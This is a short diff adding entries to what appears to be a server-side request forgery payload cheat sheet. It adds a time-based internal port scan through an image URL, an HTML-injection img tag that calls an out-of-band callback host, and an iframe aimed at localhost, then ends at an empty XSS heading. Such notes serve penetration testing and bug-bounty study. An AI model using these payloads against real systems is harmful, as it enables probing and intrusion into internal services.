@@ -43,3 +43,24 @@ http://hackinghub.io.127.0.0.1.nip.io
 ```
 https://charcoal.ctfio.com/?redirect=http://localhost:8080
 ```
+
+## In an Image Context
+
+Scan internal ports, 
+Time based
+```
+http://127.0.0.1:8080/favicon.ico
+```
+
+## Chaining HTML Injection
+
+```
+<img/src="https://puuatcmlkisigmqtcmzzjtswfv8t67vdw.oast.fun">
+```
+
+```
+<iframe/src="http://localhost:8080">
+```
+
+## Chaining XSS
+
